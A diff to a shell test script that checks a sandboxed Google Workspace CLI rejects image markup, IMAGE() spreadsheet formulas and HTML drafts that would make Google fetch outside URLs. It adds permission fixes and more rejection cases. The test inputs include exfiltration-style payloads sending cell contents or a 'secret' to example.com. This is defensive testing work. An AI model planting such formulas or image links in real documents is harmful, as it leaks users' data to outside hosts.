@@ -75,9 +75,11 @@ gog -n --json sheets append s1 A1 '=IMAGE("https://example.com/?q="&A1)' | grep 
 
 # Docs content has no image markup, which Google would fetch from any URL.
 work=$(mktemp -d)
+chmod 755 "$work"  # mktemp makes it 0700; the container's user must read it
 trap 'rm -rf "$work"' EXIT
 printf 'hello ![x](https://example.com/?q=secret)\n' > "$work/image.md"
 printf '# Plain\n\nno images, a [link](https://example.com)\n' > "$work/plain.md"
+chmod a+r "$work"/*.md
 gogv() { docker run --rm --network none -v "$work:/work" -w /work "$image" gog "$@" 2>&1 || true; }
 for cmd in "docs write d1 --markdown --append --text hi![x](https://example.com/a.png)" "docs insert d1 <IMG_src=https://example.com/a.png>" \
            "docs write d1 --markdown --append --file image.md" "docs write d1 --markdown --append --file=image.md" \
@@ -101,8 +103,10 @@ gogv docs write d1 --text hello | grep -qE "image markup|is not (enabled|availab
 # Drafts are plain text, which Gmail never fetches anything for.
 printf '<b>x</b>' > "$work/x.html"
 printf 'Subject: s\n\nx\n' > "$work/x.eml"
+chmod a+r "$work"/x.*
 for cmd in "gmail drafts create --to a@b.c --subject s --body-html <b>x</b>" "gmail drafts update d1 --subject s --body-html-file x.html" \
-           "gmail drafts create --raw-file x.eml"; do
+           "gmail drafts create --raw-file x.eml" "gmail drafts create --to a@b.c --subject s --body b --html-from-text" \
+           "gmail drafts update d1 --body b --html-from-text" "gmail drafts reply m1 --body b --html-from-text"; do
   gogv $cmd | grep -q "is not available" || fail "HTML draft accepted: $cmd"
 done
 
